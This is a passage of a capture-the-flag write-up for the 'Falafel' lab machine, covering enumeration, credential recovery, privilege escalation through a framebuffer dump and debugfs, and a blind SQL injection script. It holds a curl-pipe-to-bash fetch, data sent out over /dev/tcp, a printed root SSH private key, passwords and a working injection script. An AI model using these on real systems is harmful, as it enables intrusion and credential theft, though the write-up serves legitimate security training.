-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 3028 Aug  1  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 191 Jan 19  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 144 Nov 27  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 1371 Jan 28  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 2231 May  1 20:12 /etc/sysctl.conf


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  1  2017 .
drwxr-xr-x 14 root root 4096 Nov 27  2017 ..


### SCAN COMPLETE ####################################
www-data@falafel:/var/www$
```

![](images/41.png)

![](images/42.png)

![](images/43.png)

![](images/44.png)

![](images/45.png)

```sh
root@kali:~/falafet/www# git clone https://github.com/cmoras/linux-exploit-suggester.git
Cloning into 'linux-exploit-suggester'...
remote: Counting objects: 322, done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 322 (delta 31), reused 53 (delta 23), pack-reused 260
Receiving objects: 100% (322/322), 287.90 KiB | 2.12 MiB/s, done.
Resolving deltas: 100% (166/166), done.
root@kali:~/falafet/www# cd linux-exploit-suggester/
root@kali:~/falafet/www/linux-exploit-suggester# ls
cve_list.sql  help  les  LICENSE  linux-exploit-suggester.sh  mysql-help  readme.2  README.md  setup.sh  test
root@kali:~/falafet/www/linux-exploit-suggester# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.73 - - [24/Jun/2018 18:50:13] "GET /linux-exploit-suggester.sh HTTP/1.1" 200 -
```

```sh
www-data@falafel:/var/www$ curl http://10.10.14.16/linux-exploit-suggester.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 63226  100 63226    0     0  55587      0  0:00:01  0:00:01 --:--:-- 55607

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04.3
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

70 kernel space exploits
32 user space exploits

Possible Exploits:

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,[ubuntu=16.10|16.04|14.04|12.04]
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,[ubuntu=16.10|16.04|14.04|12.04]
   Download URL: https://www.exploit-db.com/download/40616

cat: write error: Broken pipe
[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Tags: [ubuntu=16.04|14.04]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

cat: write error: Broken pipe
[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included

cat: write error: Broken pipe
[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: [ubuntu=16.04]
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

cat: write error: Broken pipe
[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Tags: [ubuntu=16.04(kernel:4.8.0-41)]
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-7308/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Tags: [ubuntu=14.04(kernel:4.4.0-*)|16.04(kernel:4.8.0-*)]
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-1000112/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Tags: RHEL=7(kernel:3.10)
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Tags: [ubuntu=16.04|16.10],debian=7|8
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

cat: write error: Broken pipe
[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Tags: debian=9(glibc:2.24-11+deb9u1),[ubuntu=16.04.3(glibc:2.23-0ubuntu9)]
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

www-data@falafel:/var/www$
```

###### User flag

```sh
www-data@falafel:/var/www$ ls
html
www-data@falafel:/var/www$ cd html/
www-data@falafel:/var/www/html$ ls
assets		connection.php	cyberlaw.txt  header.php  images     js		login_logic.php  profile.php  style.php   uploads
authorized.php	css		footer.php    icon.png	  index.php  login.php	logout.php	 robots.txt   upload.php
www-data@falafel:/var/www/html$ cat connection.php
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
www-data@falafel:/var/www/html$
```

```sh
root@kali:~/falafet# ssh moshe@10.10.10.73
The authenticity of host '10.10.10.73 (10.10.10.73)' can't be established.
ECDSA key fingerprint is SHA256:XPYifpo9zwt53hU1RwUWqFvOB3TlCtyA1PfM9frNWSw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.73' (ECDSA) to the list of known hosts.
moshe@10.10.10.73's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Feb  5 23:35:10 2018 from 10.10.14.2
$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
$ ls
user.txt
$ cat user.txt
c866575ed5999e1a878b1494fcb1f9d3
$
```

###### Privilege Escalation using debugfs

```sh
$ bash
setterm: terminal xterm-256color does not support --blank
moshe@falafel:~$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
moshe@falafel:~$ ls -l /dev/ | grep fb
crw-rw----  1 root  video    29,   0 Jun 18 05:18 fb0
moshe@falafel:~$
```

```sh
moshe@falafel:~$ cat /dev/fb0 > /dev/tcp/10.10.14.16/9001
moshe@falafel:~$ md5sum /dev/fb0
4033cf9f028acf4e64cde81e81258b41  /dev/fb0
moshe@falafel:~$
```

```sh
root@kali:~/falafet# nc -nlvp 9001 > fb0.raw
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.73.
Ncat: Connection from 10.10.10.73:38914.
root@kali:~/falafet# md5sum fb0.raw
4033cf9f028acf4e64cde81e81258b41  fb0.raw
root@kali:~/falafet# file fb0.raw
fb0.raw: Targa image data - Map (256-257) 257 x 1 x 1 +257 +1 - 1-bit alpha "\001"
root@kali:~/falafet#
```

![](images/46.png)

```sh
moshe@falafel:~$ cd /sys/class/graphics/fb0/
moshe@falafel:/sys/class/graphics/fb0$ ls -l
total 0
-rw-r--r-- 1 root root 4096 Jun 25 02:03 bits_per_pixel
-rw-r--r-- 1 root root 4096 Jun 25 02:03 blank
-rw-r--r-- 1 root root 4096 Jun 25 02:03 bl_curve
-rw-r--r-- 1 root root 4096 Jun 25 02:03 console
-rw-r--r-- 1 root root 4096 Jun 25 02:03 cursor
-r--r--r-- 1 root root 4096 Jun 25 02:03 dev
lrwxrwxrwx 1 root root    0 Jun 25 02:03 device -> ../../../0000:00:0f.0
-rw-r--r-- 1 root root 4096 Jun 25 02:03 mode
-rw-r--r-- 1 root root 4096 Jun 25 02:03 modes
-r--r--r-- 1 root root 4096 Jun 25 02:03 name
-rw-r--r-- 1 root root 4096 Jun 25 02:03 pan
drwxr-xr-x 2 root root    0 Jun 25 01:46 power
-rw-r--r-- 1 root root 4096 Jun 25 02:03 rotate
-rw-r--r-- 1 root root 4096 Jun 25 02:03 state
-r--r--r-- 1 root root 4096 Jun 25 02:03 stride
lrwxrwxrwx 1 root root    0 Jun 18 05:18 subsystem -> ../../../../../class/graphics
-rw-r--r-- 1 root root 4096 Jun 18 05:17 uevent
-rw-r--r-- 1 root root 4096 Jun 25 02:03 virtual_size
moshe@falafel:/sys/class/graphics/fb0$ cat virtual_size
1176,885
moshe@falafel:/sys/class/graphics/fb0$
```

![](images/47.png)

![](images/48.png)

![](images/49.png)

![](images/50.png)

```
yossi
MoshePlzStopHackingMe!
```

```sh
moshe@falafel:/sys/class/graphics/fb0$ su yossi
Password:
yossi@falafel:/sys/class/graphics/fb0$ exit
exit
moshe@falafel:/sys/class/graphics/fb0$
```

```sh
root@kali:~/falafet# ssh yossi@10.10.10.73
yossi@10.10.10.73's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Jun 18 05:18:09 2018
yossi@falafel:~$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
yossi@falafel:~$ ls -l
total 0
yossi@falafel:~$ ls -lah
total 24K
drwx------ 3 yossi yossi 4.0K Jan 14 21:54 .
drwxr-xr-x 4 root  root  4.0K Nov 27  2017 ..
-rw------- 1 root  root     0 Jan 14 21:54 .bash_history
-rw-r--r-- 1 yossi yossi  220 Nov 27  2017 .bash_logout
-rw-r--r-- 1 yossi yossi 3.7K Nov 27  2017 .bashrc
drwx------ 2 yossi yossi 4.0K Nov 27  2017 .cache
-rw-r--r-- 1 yossi yossi  655 Nov 27  2017 .profile
yossi@falafel:~$ cd /dev/
yossi@falafel:/dev$ ls -l sd*
brw-rw---- 1 root disk 8, 0 Jun 18 05:18 sda
brw-rw---- 1 root disk 8, 1 Jun 18 05:18 sda1
brw-rw---- 1 root disk 8, 2 Jun 18 05:18 sda2
brw-rw---- 1 root disk 8, 5 Jun 18 05:18 sda5
yossi@falafel:/dev$ debugfs sda1
debugfs 1.42.13 (17-May-2015)
debugfs:  ls
```

![](images/51.png)

```sh
debugfs:  cd root
debugfs:  ls
```

![](images/52.png)

```sh
debugfs:  cd .ssh
debugfs:  ls
```

![](images/53.png)

```sh
debugfs:  cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
debugfs:
```

```sh
root@kali:~/falafet# nano root.key
root@kali:~/falafet# chmod 600 root.key
root@kali:~/falafet# ssh -i root.key root@10.10.10.73
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
root@falafel:~# id
uid=0(root) gid=0(root) groups=0(root)
root@falafel:~# ls
root.txt
root@falafel:~# cat root.txt
23b79200448c62ffd6f8f2091c001fa1
root@falafel:~#
```

###### Manual SQL Injection

`sql-inject.py`

```python
import requests

chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']

def GetSQL(i,c):
	return "admin' and substr(password,%s,1) = '%s'-- -" % (i,c)

for i in range(1,33):
	for c in chars:
		injection = GetSQL(i,c)
		payload = {'username':injection,'password':'randompass'}
		r = requests.post('http://10.10.10.73/login.php', data = payload)
		if "Wrong identification" in r.text:
			print(c, end='', flush=True)
			break
print()
```

```sh
root@kali:~/falafet# python3 sql-inject.py
0e462096931906507119562988736854
root@kali:~/falafet#
```